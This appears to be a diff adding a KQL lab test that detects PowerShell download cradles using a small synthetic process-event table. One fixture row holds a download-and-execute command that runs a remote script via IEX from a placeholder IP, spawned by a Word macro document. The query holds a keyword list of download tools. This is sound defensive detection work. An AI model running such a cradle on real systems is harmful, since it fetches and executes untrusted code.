@@ -1,0 +1,23 @@
+// Lab test: Suspicious PowerShell Download Cradle
+// Expected result: 1 row returned (PowerShell download/execution from remote URL).
+let DeviceProcessEvents = datatable(
+    Timestamp:datetime,
+    DeviceName:string,
+    AccountName:string,
+    FileName:string,
+    FolderPath:string,
+    ProcessCommandLine:string,
+    InitiatingProcessFileName:string,
+    InitiatingProcessCommandLine:string,
+    ReportId:long
+)
+[
+    datetime(2026-07-09T14:00:00Z), "LAB-WIN10-01", "lab.user", "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.10/a.ps1')", "winword.exe", "winword.exe C:\\Users\\lab.user\\Downloads\\invoice.docm", 4001,
+    datetime(2026-07-09T14:05:00Z), "LAB-WIN10-01", "lab.admin", "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Get-Process | Select-Object -First 5", "explorer.exe", "explorer.exe", 4002,
+    datetime(2026-07-09T14:10:00Z), "LAB-WIN10-01", "lab.user", "curl.exe", "C:\\Windows\\System32\\curl.exe", "curl.exe https://example.com/healthcheck.txt", "cmd.exe", "cmd.exe /c curl.exe https://example.com/healthcheck.txt", 4003
+];
+DeviceProcessEvents
+| where FileName in~ ("powershell.exe", "pwsh.exe")
+| where ProcessCommandLine has_any ("DownloadString", "DownloadFile", "Invoke-WebRequest", "iwr ", "curl ", "wget ", "Net.WebClient")
+| where ProcessCommandLine has_any ("http://", "https://")
+| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, ReportId
